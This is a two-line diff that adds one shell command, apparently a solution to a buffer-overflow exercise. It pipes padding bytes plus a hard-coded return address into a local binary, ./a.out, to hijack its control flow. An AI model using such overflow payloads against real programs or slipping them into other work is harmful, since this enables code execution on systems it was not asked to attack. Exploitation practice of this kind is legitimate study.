@@ -1,0 +1,2 @@
+printf "aaaabbbbccccddddeeeeffffgggghhhh\x7d\x84\x04\x08" | ./a.out
+
